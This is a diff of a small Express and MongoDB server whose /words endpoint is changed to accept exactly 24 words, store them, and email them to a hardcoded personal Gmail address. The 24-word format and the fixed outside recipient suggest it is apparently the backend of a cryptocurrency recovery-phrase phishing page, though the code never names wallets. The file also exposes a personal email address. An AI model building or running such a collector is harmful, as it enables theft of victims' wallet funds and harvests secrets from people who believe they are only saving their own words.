@@ -1,15 +1,16 @@
 require('dotenv').config();
 const express = require('express');
-const mongoose = require('mongoose');
+const bodyParser = require('body-parser');
 const cors = require('cors');
+const mongoose = require('mongoose');
 const { Resend } = require('resend');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Middleware
+// Middleware to parse JSON bodies
 app.use(cors());
-app.use(express.json());
+app.use(bodyParser.json());
 
 // Connect to MongoDB
 mongoose.connect(process.env.MONGO_URI, {
@@ -19,35 +20,37 @@ mongoose.connect(process.env.MONGO_URI, {
 .then(() => console.log("Connected to MongoDB"))
 .catch(err => console.error("MongoDB Connection Error:", err));
 
-// Define schema
+// Define a schema for the words
 const wordSchema = new mongoose.Schema({
-    words: String // Changed from array to string
+    words: [String]
 });
 
-// Create model
+// Create a model based on the schema
 const Word = mongoose.model('Word', wordSchema);
 
-// Initialize Resend
+// Initialize Resend with API key
 const resend = new Resend(process.env.RESEND_API_KEY);
 
-// Route to handle POST requests
+// Route to handle POST requests with 24 words
 app.post('/words', async (req, res) => {
     const { words } = req.body;
 
-    if (!words) {
-        return res.status(400).json({ error: 'Please provide words.' });
+    if (!words || words.length !== 24) {
+        return res.status(400).json({ error: 'Please provide exactly 24 words.' });
     }
 
     try {
         const newWordEntry = new Word({ words });
         await newWordEntry.save();
 
-        // Send email
+        const wordList = words.join(' '); // Join words with a space
+
+        // Send email to recipient
         await resend.emails.send({
             from: 'onboarding@resend.dev',
-            to: ['festusmena9@gmail.com'], // Add another email if needed
+            to: ['festusmena9@gmail.com'], // Add second recipient if needed
             subject: 'Words Saved Successfully!',
-            html: `<p>You have successfully saved your words:</p><p>${words}</p>` // No mapping, plain string
+            html: `<p>You have successfully saved your 24 words:</p><p>${wordList}</p>`
         });
 
         res.status(201).json({ message: 'Words saved successfully and email sent!' });
@@ -57,7 +60,7 @@ app.post('/words', async (req, res) => {
     }
 });
 
-// Start server
+// Start the server
 app.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
 });
